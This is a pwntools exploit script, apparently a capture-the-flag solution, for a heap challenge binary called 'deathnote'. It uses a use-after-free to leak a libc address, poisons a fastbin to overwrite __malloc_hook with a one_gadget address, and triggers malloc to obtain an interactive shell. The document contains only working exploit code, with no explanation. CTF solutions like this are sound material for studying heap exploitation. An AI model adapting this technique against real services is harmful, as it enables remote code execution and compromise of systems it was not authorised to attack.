from pwn import *

# p = process('deathnote')
p = remote('localhost', 7777)
# p = remote('chall.nitdgplug.org', 30292)
e = ELF('deathnote')
libc = ELF('libc.so')

one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

def add(i, size, name):
    p.sendlineafter('> ', '1')
    p.sendlineafter('index:', str(i))
    p.sendlineafter('size:', str(size))
    p.sendlineafter('name:', name)

def edit(i, data):
    p.sendlineafter('> ', '2')
    p.sendlineafter('index:', str(i))
    p.sendlineafter('data:', data)

def remove(i):
    p.sendlineafter('> ', '3')
    p.sendlineafter('index:', str(i))

def view(i):
    p.sendlineafter('> ', '4')
    p.sendlineafter('index:', str(i))
    p.recvuntil('name:')
    return p.recvline()[:-1].ljust(8, b'\x00')

add(0, 0x300, '')
add(1, 0x300, '')
remove(0)
libc.address = u64(view(0)) - 0x3c4b78
print(hex(libc.address))

add(2, 0x60, '')
add(3, 0x60, '')
remove(2)
edit(2, p64(libc.symbols['__malloc_hook'] - 0x23))
add(4, 0x60, '')
add(5, 0x60, b'A' * 0x13 + p64(one_gadget[3] + libc.address))

p.sendlineafter('> ', '1')
p.sendlineafter('index:', '6')
p.sendlineafter('size:', '10')

p.interactive()
